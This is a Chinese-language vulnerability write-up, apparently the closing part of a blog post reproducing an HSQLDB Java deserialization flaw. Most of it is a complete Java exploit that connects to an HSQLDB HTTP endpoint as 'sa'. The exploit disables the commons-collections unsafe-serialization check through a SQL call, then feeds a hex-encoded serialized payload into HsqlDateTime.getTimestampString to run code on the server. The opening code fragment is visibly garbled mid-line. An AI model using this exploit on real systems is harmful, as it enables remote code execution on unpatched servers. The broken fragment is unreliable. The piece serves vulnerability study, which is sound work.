首先我们看看Function.java中的函数是如何调用的
    private Object[] getArguments(Session session) throws HsqlException {
            int i = bConnection ? 1: 0;
            Object[] oArg = new Object[iArgCount];
            for (; i  /tmp/calc.ser`
## 0x4 编写利用代码
  1. Java Hex 编码需要下载commons.codec依赖包  
  2. 运行时添加 hsqldb.jar 依赖库
用intellij 运行以下代码即可实现反序列化漏洞
    import org.apache.commons.codec.binary.Hex;
    import java.io.IOException;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.sql.Connection;
    import java.sql.DriverManager;
    import java.sql.SQLException;
    import java.sql.Statement;
    public class testjava {
        public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {
            String url = "http://localhost:8080";
            String payload = Hex.encodeHexString(Files.readAllBytes(Paths.get("/tmp/calc.ser")));
            System.out.println(payload);
            String dburl = "jdbc:hsqldb:" + url + "/hsqldb_war_exploded/hsqldb/";
            Class.forName("org.hsqldb.jdbcDriver");
            Connection connection = DriverManager.getConnection(dburl, "sa", "");
            Statement statement = connection.createStatement();
            statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
            statement.execute("call \"org.hsqldb.HsqlDateTime.getTimestampString\"('2011-01-01','" + payload + "');");
        }
    }
在序列化及反序列化过程中，如果禁用了不安全类的序列化操作，那么就会在序列化过程中抛出UnsupportedOperationException。可以通过设置org.apache.commons.collections.enableUnsafeSerialization为true关闭该检测。
# 0x04 总结
通过分析复现hsqldb反序列化漏洞，掌握了hsqldb的数据格式解析过程，从0到1的完成了漏洞点发现、调用路由梳理、exp构造、payload生成，较为全面的分析了反序列化漏洞在hsqldb中的利用方式。关于hsqldb还有很多相关的漏洞要分析，笔者留着以后填坑。
# 参考文章